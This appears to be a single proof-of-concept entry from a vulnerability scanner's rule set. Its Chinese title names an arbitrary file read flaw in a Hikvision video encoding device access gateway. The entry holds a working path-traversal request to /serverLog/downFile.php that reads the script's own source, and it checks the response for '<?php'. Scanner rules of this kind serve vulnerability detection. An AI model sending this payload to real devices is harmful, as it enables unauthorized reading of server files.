{
        'name': '​海康威视视频编码设备接入网关存在任意文件读取漏洞',
        'poc':[{'requests':{
            'method': 'get',
            'payload': '/serverLog/downFile.php?fileName=../web/html/serverLog/downFile.php',
            'headers': {
                'User-Agent': 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)',
                'Accept-Encoding': 'gzip, deflate',
                'Accept': '*/*',
                'Connection': 'close'
            },
            'dnslog': False,
            'sqltime': False,
            'filelocate': False
        },
        'response': {
            'status_code': 200,
            'text': '<?php'
        }}]
    }